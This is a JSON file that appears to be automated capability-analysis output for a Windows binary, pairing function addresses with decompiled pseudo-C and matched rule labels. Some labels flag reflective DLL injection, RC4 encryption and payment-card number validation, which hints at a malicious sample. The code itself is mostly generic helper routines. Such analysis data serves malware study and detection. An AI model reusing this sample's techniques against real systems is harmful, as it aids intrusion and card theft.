            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00406834(void)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t unaff_EDI;\n    \n    uVar1 = *(*(in_EAX + 0xc) + -2 + *(in_EAX + 4) * 2);\n    *(unaff_EDI + 0xc) = in_EAX;\n    fcn.00406389();\n    uVar2 = fcn.00406622(unaff_EDI, in_EAX, 0x10000 / (uVar1 + 1) & 0xffff);\n    *(unaff_EDI + 0x10) = uVar2;\n    fcn.00406389();\n    return;\n}\n",
        "token_count": 166
    },
    "00407702": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407702(uint arg_8h)\n\n{\n    fcn.00404c43(arg_8h, 0, 0x128);\n    return;\n}\n",
        "token_count": 42
    },
    "00407ddf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00407ddf(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407bc3(arg_8h, 0, arg_ch);\n    return iVar1 == 0;\n}\n",
        "token_count": 60
    },
    "00407df9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00407df9(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407bc3(arg_8h, 1, arg_ch);\n    return iVar1 == 0;\n}\n",
        "token_count": 61
    },
    "00407e4d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00407e4d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00408a3f(arg_8h, arg_ch, arg_10h, arg_14h);\n    iVar1 = fcn.00408abb(0, arg_18h, 0x28);\n    fcn.004089eb();\n    return 0 < iVar1;\n}\n",
        "token_count": 129
    },
    "00407e94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407e94(void)\n\n{\n    int32_t *unaff_ESI;\n    \n    if (*unaff_ESI != 0) {\n        fcn.00404d6a(*unaff_ESI);\n    }\n    if (unaff_ESI[2] != 0) {\n        fcn.00404d6a(unaff_ESI[2]);\n    }\n    fcn.00404c43(unaff_ESI + 4, 0, 0x20);\n    fcn.00404d6a(unaff_ESI);\n    return;\n}\n",
        "token_count": 127
    },
    "00408681": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408681(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "0040868e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.0040868e(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    int32_t arg_10h;\n    int32_t iVar4;\n    \n    pcVar2 = fcn.00405093(arg_8h);\n    if (pcVar2 != NULL) {\n        pcVar3 = pcVar2;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        arg_10h = pcVar3 - (pcVar2 + 1);\n        do {\n            pcVar3 = pcVar2;\n            iVar4 = fcn.004080fa(arg_8h, pcVar3, arg_10h, arg_ch);\n            if (iVar4 != 0) {\n                return pcVar3;\n            }\n            arg_10h = arg_10h * 2;\n            pcVar2 = fcn.00404d43(pcVar3, arg_10h + 1);\n        } while (pcVar2 != NULL);\n        fcn.00404d6a(pcVar3);\n        pcVar2 = NULL;\n    }\n    return pcVar2;\n}\n",
        "token_count": 283
    },
    "004086f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.004086f0(uint arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    piVar2 = fcn.00405061(arg_8h);\n    if (piVar2 != NULL) {\n        piVar3 = piVar2;\n        do {\n            iVar1 = *piVar3;\n            piVar3 = piVar3 + 1;\n        } while (iVar1 != 0);\n        iVar4 = piVar3 - (piVar2 + 1) >> 1;\n        iVar5 = fcn.00408207(arg_8h, iVar4, fcn.0040809c, arg_ch);\n        if (iVar5 == 0) {\n            iVar4 = iVar4 * 2;\n            piVar3 = piVar2;\n            do {\n                piVar2 = fcn.00404d43(piVar3, iVar4 * 2 + 2);\n                if (piVar2 == NULL) {\n                    fcn.00404d6a(piVar3);\n                    return NULL;\n                }\n                iVar5 = fcn.00408207(arg_8h, iVar4, fcn.0040809c, arg_ch);\n                iVar4 = iVar4 * 2;\n                piVar3 = piVar2;\n            } while (iVar5 == 0);\n        }\n    }\n    return piVar2;\n}\n",
        "token_count": 345
    },
    "0040880c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t fcn.0040880c(void)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    int32_t iVar2;\n    ulong uVar3;\n    \n    iVar1 = *in_EAX;\n    fcn.00408681();\n    uVar3 = fcn.00408681();\n    iVar2 = (uVar3 >> 0x20) - (uVar3 & 0xffff);\n    while ((iVar2 == 0 && (iVar1 != 0))) {\n        in_EAX = in_EAX + 1;\n        iVar1 = *in_EAX;\n        fcn.00408681();\n        uVar3 = fcn.00408681();\n        iVar2 = (uVar3 >> 0x20) - (uVar3 & 0xffff);\n    }\n    if (iVar2 < 0) {\n        iVar2 = -1;\n    }\n    else if (0 < iVar2) {\n        iVar2 = 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 225
    },
    "00408a3f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408a3f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *puVar2;\n    \n    if (*in_EAX != 0) {\n        fcn.004089eb();\n    }\n    uVar1 = fcn.004067f5();\n    puVar2 = fcn.00404d22(1, 0x14);\n    *in_EAX = puVar2;\n    puVar2[4] = uVar1;\n    puVar2[3] = arg_ch;\n    uVar1 = fcn.004065b6(arg_8h);\n    *puVar2 = uVar1;\n    fcn.00406834();\n    uVar1 = fcn.004065b6(arg_10h);\n    puVar2[1] = uVar1;\n    fcn.00406389();\n    return;\n}\n",
        "token_count": 221
    },
    "00408abb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408abb(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    ushort *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 0xc);\n    iVar3 = iVar2 - (arg_10h & 0xffff);\n    *in_EAX = 0x200;\n    iVar1 = fcn.004089ba();\n    if ((iVar1 == 0) < 0) {\n        iVar2 = -1;\n    }\n    else {\n        *(in_EAX + iVar3 + -1) = 0;\n        fcn.00404c71(in_EAX + iVar3, arg_ch, arg_10h & 0xffff);\n        arg_8h_00 = fcn.004065b6(in_EAX);\n        fcn.00408a9f(arg_8h_00);\n        fcn.00406541(*(arg_8h + 0x10), in_EAX);\n        fcn.004063ac();\n    }\n    return iVar2;\n}\n",
        "token_count": 273
    },
    "00403dfd": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403dfd(uint arg_8h, uint dwMilliseconds)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lpExitCode;\n    \n    lpExitCode = 0;\n    iVar1 = fcn.00405093(arg_8h);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00403c1a, iVar1, 0, 0),  iVar1 != 0)) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar1, dwMilliseconds);\n        if (iVar2 == 0) {\n            lpExitCode = (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(iVar1, &lpExitCode);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return lpExitCode;\n}\n",
        "token_count": 207
    },
    "00404457": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint32_t fcn.00404457(void)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t *in_EAX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    puVar1 = in_EAX + 4;\n    do {\n        (*pcVar2)(puVar1);\n        pcVar3 = _sym.imp.KERNEL32.dll_ResetEvent;\n        if (*in_EAX < in_EAX[1]) {\n            if (*in_EAX == 0) {\n                iVar4 = (*_sym.imp.KERNEL32.dll_ResetEvent)(in_EAX[3]);\n                if (iVar4 == 0) break;\n            }\n            *in_EAX = *in_EAX + 1;\n            if (in_EAX[1] < *in_EAX || in_EAX[1] == *in_EAX) {\n                iVar4 = (*pcVar3)(in_EAX[2]);\n                if (iVar4 == 0) break;\n            }\n            uVar5 = in_EAX[1] <= *in_EAX;\n            goto code_r0x004044b9;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(in_EAX[2], 0xffffffff);\n    } while (iVar4 == 0);\n    uVar5 = 0xffffffff;\ncode_r0x004044b9:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n    return uVar5;\n}\n",
        "token_count": 372
    },
    "0040450c": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.0040450c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(in_EAX + 0xc), 0xffffffff);\n    if (iVar1 != 0) {\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 101
    },
    "00402789": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nint32_t * fcn.00402789(void)\n\n{\n    code *pcVar1;\n    int32_t *arg_8h;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    arg_8h = fcn.00404cfe(0x38);\n    if (arg_8h != NULL) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_InitializeCriticalSectionAndSpinCount)(arg_8h + 3, 4000);\n        if (iVar2 == 0) {\n            fcn.00404d6a(arg_8h);\n        }\n        else {\n            arg_8h[0xd] = 0x10000;\n            arg_8h[0xc] = 0x100000;\n            arg_8h[0xb] = 0;\n            puVar3 = fcn.00404cfe(0x18);\n            if (puVar3 != NULL) {\n                *puVar3 = 0;\n                puVar3[1] = 0;\n                puVar3[2] = 0;\n                puVar3[3] = 0;\n                puVar3[4] = 0;\n                puVar3[5] = 0;\n            }\n            pcVar1 = _sym.imp.KERNEL32.dll_CreateEventW;\n            arg_8h[9] = puVar3;\n            arg_8h[10] = 4;\n            iVar2 = (*pcVar1)(0, 1, 1, 0);\n            *arg_8h = iVar2;\n            iVar2 = (*pcVar1)(0, 1, 1, 0);\n            arg_8h[1] = iVar2;\n            iVar2 = (*pcVar1)(0, 1, 1, 0);\n            arg_8h[2] = iVar2;\n            if (((arg_8h[9] == 0) || (*arg_8h == 0)) || (arg_8h[1] == 0)) {\n                fcn.00402730();\n                arg_8h = NULL;\n            }\n            iVar2 = fcn.0040264d();\n            if (iVar2 != 0) {\n                return arg_8h;\n            }\n            fcn.00402730();\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 523
    },
    "0040284f": {
        "rules": [
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.0040284f(void)\n\n{\n    code *pcVar1;\n    uint *unaff_ESI;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(unaff_ESI + 3);\n    pcVar1 = _sym.imp.KERNEL32.dll_SetEvent;\n    unaff_ESI[10] = unaff_ESI[10] | 1;\n    (*pcVar1)(unaff_ESI[1]);\n    (*pcVar1)(*unaff_ESI);\n    (*pcVar1)(unaff_ESI[2]);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(unaff_ESI + 3);\n    return;\n}\n",
        "token_count": 145
    },
    "00404cdc": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404cdc(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    while( true ) {\n        arg_10h = arg_10h + -1;\n        if ((arg_10h == 0) || (*arg_8h != *arg_ch)) break;\n        arg_8h = arg_8h + 1;\n        arg_ch = arg_ch + 1;\n    }\n    return *arg_8h - *arg_ch;\n}\n",
        "token_count": 120
    },
    "00404de9": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404de9(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = *arg_ch;\n    iVar1 = *arg_8h - uVar2;\n    if (iVar1 == 0) {\n        iVar3 = arg_8h - arg_ch;\n        do {\n            if (uVar2 == 0) break;\n            arg_ch = arg_ch + 1;\n            uVar2 = *arg_ch;\n            iVar1 = arg_ch[iVar3] - uVar2;\n        } while (iVar1 == 0);\n    }\n    if (iVar1 < 0) {\n        return -1;\n    }\n    if (0 < iVar1) {\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 199
    },
    "004062ce": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004062ce(int32_t param_1)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint16_t *puVar5;\n    \n    iVar1 = *(param_1 + 4);\n    if (*(in_EAX + 4) < iVar1) {\n        return 1;\n    }\n    if (*(in_EAX + 4) <= iVar1) {\n        iVar4 = iVar1 + -1;\n        puVar5 = *(param_1 + 0xc) + iVar4 * 2;\n        while( true ) {\n            uVar2 = *puVar5;\n            uVar3 = *((*(in_EAX + 0xc) - *(param_1 + 0xc)) + puVar5);\n            if (uVar2 >= uVar3 && uVar2 != uVar3) {\n                return 1;\n            }\n            if (uVar2 < uVar3) break;\n            puVar5 = puVar5 + -1;\n            iVar4 = iVar4 + -1;\n            if (iVar4 < 0) {\n                return 0;\n            }\n        }\n        return 0xffffffff;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 288
    },
    "00402e19": {
        "rules": [
            "get disk information"
        ],
        "decompiled_code": "\nuint fcn.00402e19(void)\n\n{\n    uint arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint var_4h;\n    \n    var_4h = 0;\n    arg_8h = fcn.00402d53(0x17);\n    uVar7 = 0;\n    uVar6 = 0;\n    uVar5 = 0;\n    uVar4 = 0;\n    puVar3 = &var_4h;\n    uVar1 = fcn.00404d94(arg_8h);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetVolumeInformationW)(arg_8h, 0, uVar1, puVar3, uVar4, uVar5, uVar6, uVar7);\n    if (iVar2 == 0) {\n        var_4h = 0;\n    }\n    fcn.00402b7a(arg_8h);\n    return var_4h;\n}\n",
        "token_count": 250
    },
    "00404c96": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00404c96(uchar *arg_8h, uchar *arg_ch, int32_t arg_10h)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    \n    if ((arg_ch < arg_8h) && (puVar2 = arg_ch + arg_10h,  arg_8h < puVar2)) {\n        puVar1 = arg_8h + arg_10h + -1;\n        if (arg_10h != 0) {\n            do {\n                puVar2 = puVar2 + -1;\n                *puVar1 = *puVar2;\n                puVar1 = puVar1 + -1;\n                arg_10h = arg_10h + -1;\n            } while (arg_10h != 0);\n        }\n    }\n    else if (arg_10h != 0) {\n        iVar3 = arg_8h - arg_ch;\n        do {\n            arg_ch[iVar3] = *arg_ch;\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 275
    },
    "00404e4b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00404e4b(char *arg_8h, uint arg_ch)\n\n{\n    while( true ) {\n        if (*arg_8h == '\\0') {\n            if (arg_ch != '\\0') {\n                arg_8h = NULL;\n            }\n            return arg_8h;\n        }\n        if (*arg_8h == arg_ch) break;\n        arg_8h = arg_8h + 1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 109
    },
    "00404e95": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00404e95(char *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = arg_8h;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    do {\n        pcVar2 = pcVar2 + -1;\n        if (pcVar2 == arg_8h) break;\n    } while (*pcVar2 != arg_ch);\n    if (*pcVar2 != arg_ch) {\n        pcVar2 = NULL;\n    }\n    return pcVar2;\n}\n",
        "token_count": 151
    },
    "00404ff2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404ff2(int32_t arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = arg_8h - arg_ch;\n    do {\n        cVar1 = *arg_ch;\n        arg_ch[iVar2] = cVar1;\n        arg_ch = arg_ch + 1;\n    } while (cVar1 != '\\0');\n    return arg_8h;\n}\n",
        "token_count": 105
    },
    "004063ac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004063ac(void)\n\n{\n    int32_t *piVar1;\n    int32_t *arg_8h;\n    int32_t unaff_EDI;\n    \n    arg_8h = *(unaff_EDI + 4);\n    if (arg_8h != NULL) {\n        do {\n            piVar1 = *arg_8h;\n            fcn.00404d6a(arg_8h[3]);\n            fcn.00404d6a(arg_8h);\n            arg_8h = piVar1;\n        } while (piVar1 != NULL);\n        *(unaff_EDI + 0x20) = 0;\n        *(unaff_EDI + 4) = 0;\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "0040682b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040682b(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uStack16;\n    uint16_t *puStack12;\n    int32_t iStack8;\n    \n    iVar1 = *(param_2 + 4);\n    iStack8 = 0;\n    iVar2 = *(param_3 + 4);\n    iVar4 = fcn.00406406();\n    iVar4 = *(iVar4 + 0xc);\n    iVar3 = *(param_2 + 0xc);\n    puStack12 = *(param_3 + 0xc);\n    fcn.00404c43(iVar4, 0, (iVar2 + iVar1) * 2);\n    do {\n        iVar7 = 0;\n        uStack16 = 0;\n        iVar6 = iStack8;\n        do {\n            uVar5 = *(iVar3 + iVar7 * 2) * *puStack12 + *(iVar4 + iVar6 * 2) + uStack16;\n            *(iVar4 + iVar6 * 2) = uVar5;\n            uStack16 = uVar5 >> 0x10;\n            iVar6 = iVar6 + 1;\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < iVar1);\n        iStack8 = iStack8 + 1;\n        puStack12 = puStack12 + 1;\n        *(iVar4 + iVar6 * 2) = uVar5 >> 0x10;\n    } while (iStack8 < iVar2);\n    fcn.0040634a();\n    fcn.0040634a();\n    fcn.004061e8();\n    return;\n}\n",
        "token_count": 425
    },
    "00408562": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.00408562(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    char *unaff_EBX;\n    \n    uVar4 = 0;\n    uVar2 = in_EAX;\n    if (in_EAX != 0) {\n        do {\n            uVar2 = uVar2 >> 4;\n            uVar4 = uVar4 + 1;\n        } while (uVar2 != 0);\n        uVar2 = uVar4;\n        if (8 < uVar4) goto code_r0x0040857f;\n    }\n    uVar2 = 8;\ncode_r0x0040857f:\n    uVar1 = 1;\n    if ((uVar2 == 0) || (uVar1 = 8,  uVar4 < 9)) {\n        pcVar3 = unaff_EBX + uVar1;\n        *pcVar3 = '\\0';\n        for (; in_EAX != 0; in_EAX = in_EAX / 0x10) {\n            pcVar3 = pcVar3 + -1;\n            *pcVar3 = \"0123456789ABCDEF\"[in_EAX % 0x10];\n        }\n        while (unaff_EBX < pcVar3) {\n            pcVar3 = pcVar3 + -1;\n            *pcVar3 = '0';\n        }\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 352
    },
    "004085bb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.004085bb(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    ushort uVar4;\n    uint32_t uVar5;\n    ushort *unaff_EBX;\n    \n    uVar5 = 0;\n    uVar2 = in_EAX;\n    if (in_EAX != 0) {\n        do {\n            uVar2 = uVar2 >> 4;\n            uVar5 = uVar5 + 1;\n        } while (uVar2 != 0);\n        uVar2 = uVar5;\n        if (8 < uVar5) goto code_r0x004085d8;\n    }\n    uVar2 = 8;\ncode_r0x004085d8:\n    uVar1 = 1;\n    if ((uVar2 == 0) || (uVar1 = 8,  uVar5 < 9)) {\n        puVar3 = unaff_EBX + uVar1;\n        uVar4 = 0;\n        for (; *puVar3 = uVar4,  in_EAX != 0; in_EAX = in_EAX / 0x10) {\n            puVar3 = puVar3 + -1;\n            uVar4 = *((in_EAX % 0x10) * 2 + 0x40a400);\n        }\n        while (unaff_EBX < puVar3) {\n            puVar3 = puVar3 + -1;\n            *puVar3 = 0x30;\n        }\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 372
    },
    "0040886a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.0040886a(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    int32_t arg_10h;\n    int32_t iVar4;\n    \n    pcVar2 = fcn.00405093(param_1);\n    if (pcVar2 != NULL) {\n        pcVar3 = pcVar2;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        arg_10h = pcVar3 - (pcVar2 + 1);\n        do {\n            pcVar3 = pcVar2;\n            iVar4 = fcn.004080fa(param_1, pcVar3, arg_10h, param_2);\n            if (iVar4 != 0) {\n                return pcVar3;\n            }\n            arg_10h = arg_10h * 2;\n            pcVar2 = fcn.00404d43(pcVar3, arg_10h + 1);\n        } while (pcVar2 != NULL);\n        fcn.00404d6a(pcVar3);\n        pcVar2 = NULL;\n    }\n    return pcVar2;\n}\n",
        "token_count": 280
    },
    "00408873": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint16_t * fcn.00408873(uint param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    piVar2 = fcn.00405061(param_1);\n    if (piVar2 != NULL) {\n        piVar3 = piVar2;\n        do {\n            iVar1 = *piVar3;\n            piVar3 = piVar3 + 1;\n        } while (iVar1 != 0);\n        iVar4 = piVar3 - (piVar2 + 1) >> 1;\n        iVar5 = fcn.00408207(param_1, iVar4, fcn.0040809c, param_2);\n        if (iVar5 == 0) {\n            iVar4 = iVar4 * 2;\n            piVar3 = piVar2;\n            do {\n                piVar2 = fcn.00404d43(piVar3, iVar4 * 2 + 2);\n                if (piVar2 == NULL) {\n                    fcn.00404d6a(piVar3);\n                    return NULL;\n                }\n                iVar5 = fcn.00408207(param_1, iVar4, fcn.0040809c, param_2);\n                iVar4 = iVar4 * 2;\n                piVar3 = piVar2;\n            } while (iVar5 == 0);\n        }\n    }\n    return piVar2;\n}\n",
        "token_count": 334
    },
    "null": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid entry0(void)\n\n{\n    code *pcVar1;\n    \n    fcn.0040211e();\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 59
    },
    "00405444": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.00405444(void)\n\n{\n    code *pcVar1;\n    \n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0xff);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 55
    },
    "0040634a": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040634a(uint *param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    if ((param_1[2] != 0x7fff55aa) && (iVar3 = param_1[2] + -1,  param_1[2] = iVar3,  iVar3 < 1)) {\n        *param_1 = *(in_EAX + 4);\n        *(in_EAX + 0x20) = *(in_EAX + 0x20) + 1;\n        piVar1 = in_EAX + 0x1c;\n        *piVar1 = *piVar1 + -1;\n        *(in_EAX + 4) = param_1;\n        if (*piVar1 < 0) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0xff);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "0040651b": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.0040651b(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t unaff_EDI;\n    \n    fcn.00406373();\n    fcn.0040634a();\n    fcn.00406373();\n    puVar2 = *(unaff_EDI + 0x10);\n    if ((puVar2[2] != 0x7fff55aa) && (iVar4 = puVar2[2] + -1,  puVar2[2] = iVar4,  iVar4 < 1)) {\n        *puVar2 = *(unaff_EDI + 4);\n        *(unaff_EDI + 0x20) = *(unaff_EDI + 0x20) + 1;\n        piVar1 = unaff_EDI + 0x1c;\n        *piVar1 = *piVar1 + -1;\n        *(unaff_EDI + 4) = puVar2;\n        if (*piVar1 < 0) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0xff);\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "00405eb6": {
        "rules": [
            "hash data using SHA256"
        ],
        "decompiled_code": "\nvoid fcn.00405eb6(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x40) = 0;\n    *(in_EAX + 0x48) = 0;\n    *(in_EAX + 0x4c) = 0;\n    *(in_EAX + 0x50) = 0x6a09e667;\n    *(in_EAX + 0x54) = 0xbb67ae85;\n    *(in_EAX + 0x58) = 0x3c6ef372;\n    *(in_EAX + 0x5c) = 0xa54ff53a;\n    *(in_EAX + 0x60) = 0x510e527f;\n    *(in_EAX + 100) = 0x9b05688c;\n    *(in_EAX + 0x68) = 0x1f83d9ab;\n    *(in_EAX + 0x6c) = 0x5be0cd19;\n    return;\n}\n",
        "token_count": 236
    }
}